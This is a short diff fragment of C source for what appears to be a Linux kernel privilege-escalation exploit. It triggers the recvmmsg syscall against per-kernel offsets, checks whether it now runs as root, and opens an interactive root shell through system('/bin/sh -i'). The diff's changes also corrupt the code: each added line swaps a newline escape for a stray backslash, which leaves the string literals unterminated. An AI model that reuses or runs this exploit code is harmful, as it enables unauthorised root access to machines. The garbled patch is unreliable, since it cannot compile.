@@ -115,11 +115,11 @@ void trigger() {\n
     open("/proc/sys/net/core/somaxconn",O_RDONLY);\n
 \n
     if(getuid() != 0) {\n
-        fprintf(stderr,"not root, ya blew it!\n");\n
+        fprintf(stderr,"not root, ya blew it!\");\n
         exit(-1);\n
     }\n
 \n
-    fprintf(stderr,"w00p w00p!\n");\n
+    fprintf(stderr,"w00p w00p!\");\n
     system("/bin/sh -i");\n
 }\n
 \n
@@ -163,7 +163,7 @@ int main(void)\n
     }\n
 \n
     if(!off) {\n
-        fprintf(stderr,"no offsets for this kernel version..\n");\n
+        fprintf(stderr,"no offsets for this kernel version..\");\n
         exit(-1);\n
     }\n
 \n
@@ -218,13 +218,13 @@ int main(void)\n
         udp(i);\n
         retval = syscall(__NR_recvmmsg, sockfd, msgs, VLEN, 0, (void *)off->dest+7-i);\n
         if(!retval) {\n
-            fprintf(stderr,"\nrecvmmsg() failed\n");\n
+            fprintf(stderr,"\recvmmsg() failed\");\n
         }\n
     }\n
 \n
     close(sockfd);\n
 \n
-    fprintf(stderr,"\n");\n
+    fprintf(stderr,"\");\n
 \n
     trigger();\n
 }\n
